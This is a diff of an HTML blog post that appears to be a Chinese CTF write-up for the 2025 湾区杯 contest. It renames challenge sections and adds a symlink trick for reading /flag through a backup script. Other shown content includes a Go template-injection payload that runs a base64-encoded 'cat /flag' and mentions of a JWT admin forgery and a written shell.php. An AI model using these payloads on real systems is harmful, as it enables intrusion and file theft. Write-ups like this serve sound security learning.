@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="2025湾区杯wp ssti go的ssti\n输入{{.}}回显函数的map信息，确认是go的ssti\n1 map[B64Decode:0x6ee380 exec:0x6ee120] 然后直接打cat /flag\n1 {{exec (B64Decode &#34;Y2F0IC9mbGFn&#34;)}} easy_readfile 一个上传，看看网页源码，有一个auth路由拿jwt，显然要伪造admin，但是没有sercet-key\n">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="2025湾区杯wp ssti go的ssti\n输入{{.}}回显函数的map信息，确认是go的ssti\n1 map[B64Decode:0x6ee380 exec:0x6ee120] 然后直接打cat /flag\n1 {{exec (B64Decode &#34;Y2F0IC9mbGFn&#34;)}} ez_python 一个上传，看看网页源码，有一个auth路由拿jwt，显然要伪造admin，但是没有sercet-key\n">
 <title>2025湾区杯wp</title>
 
 <link rel='canonical' href='https://0d000721999.github.io/p/2025%E6%B9%BE%E5%8C%BA%E6%9D%AFwp/'>
 
 <link rel="stylesheet" href="/scss/style.min.37a6022266b4205ec3a616ff86e34064f3524e0913faf185a3d362063a8d7490.css"><meta property='og:title' content="2025湾区杯wp">
-<meta property='og:description' content="2025湾区杯wp ssti go的ssti\n输入{{.}}回显函数的map信息，确认是go的ssti\n1 map[B64Decode:0x6ee380 exec:0x6ee120] 然后直接打cat /flag\n1 {{exec (B64Decode &#34;Y2F0IC9mbGFn&#34;)}} easy_readfile 一个上传，看看网页源码，有一个auth路由拿jwt，显然要伪造admin，但是没有sercet-key\n">
+<meta property='og:description' content="2025湾区杯wp ssti go的ssti\n输入{{.}}回显函数的map信息，确认是go的ssti\n1 map[B64Decode:0x6ee380 exec:0x6ee120] 然后直接打cat /flag\n1 {{exec (B64Decode &#34;Y2F0IC9mbGFn&#34;)}} ez_python 一个上传，看看网页源码，有一个auth路由拿jwt，显然要伪造admin，但是没有sercet-key\n">
 <meta property='og:url' content='https://0d000721999.github.io/p/2025%E6%B9%BE%E5%8C%BA%E6%9D%AFwp/'>
 <meta property='og:site_name' content='美咕噜的小站'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:published_time' content='2025-09-08T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-08T00:00:00&#43;00:00'/><meta property='og:image' content='https://0d000721999.github.io/p/2025%E6%B9%BE%E5%8C%BA%E6%9D%AFwp/1.png' />
 <meta name="twitter:title" content="2025湾区杯wp">
-<meta name="twitter:description" content="2025湾区杯wp ssti go的ssti\n输入{{.}}回显函数的map信息，确认是go的ssti\n1 map[B64Decode:0x6ee380 exec:0x6ee120] 然后直接打cat /flag\n1 {{exec (B64Decode &#34;Y2F0IC9mbGFn&#34;)}} easy_readfile 一个上传，看看网页源码，有一个auth路由拿jwt，显然要伪造admin，但是没有sercet-key\n"><meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:description" content="2025湾区杯wp ssti go的ssti\n输入{{.}}回显函数的map信息，确认是go的ssti\n1 map[B64Decode:0x6ee380 exec:0x6ee120] 然后直接打cat /flag\n1 {{exec (B64Decode &#34;Y2F0IC9mbGFn&#34;)}} ez_python 一个上传，看看网页源码，有一个auth路由拿jwt，显然要伪造admin，但是没有sercet-key\n"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://0d000721999.github.io/p/2025%E6%B9%BE%E5%8C%BA%E6%9D%AFwp/1.png' />
     <link rel="shortcut icon" href="/favicon.ico" />
 
@@ -269,8 +269,8 @@
             <nav id="TableOfContents">
   <ol>
     <li><a href="#ssti">ssti</a></li>
+    <li><a href="#ez_python">ez_python</a></li>
     <li><a href="#easy_readfile">easy_readfile</a></li>
-    <li><a href="#ez_readfile">ez_readfile</a></li>
   </ol>
 </nav>
         </div>
@@ -383,7 +383,7 @@
 <pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{exec (B64Decode &#34;Y2F0IC9mbGFn&#34;)}}
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="easy_readfile">easy_readfile
+</div><h2 id="ez_python">ez_python
 </h2><p>一个上传，看看网页源码，有一个auth路由拿jwt，显然要伪造admin，但是没有sercet-key</p>
 <p><img src="/p/2025%E6%B9%BE%E5%8C%BA%E6%9D%AFwp/image-20250908194723236.png"
 	width="742"
@@ -596,7 +596,7 @@
 		data-flex-basis="428px"
 	
 ></p>
-<h2 id="ez_readfile">ez_readfile
+<h2 id="easy_readfile">easy_readfile
 </h2><p>链子基本没有，因为直接就能触发<code>__destruct</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -724,7 +724,41 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>然后写入了shell.php,然后拿flag</p>
-
+<p>这里还有一个问题就是，有个bash脚本一直在运行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">cd</span> /var/www/html/
+</span></span><span class="line"><span class="cl"><span class="k">while</span> :
+</span></span><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl">    cp -P * /var/www/html/backup/
+</span></span><span class="line"><span class="cl">    chmod <span class="m">755</span> -R /var/www/html/backup/
+</span></span><span class="line"><span class="cl">    sleep <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们直接软连接/flag，然后去backup目录拿flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ln -s /flag flag
+</span></span><span class="line"><span class="cl">cat backup/flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
 </section>
 
 
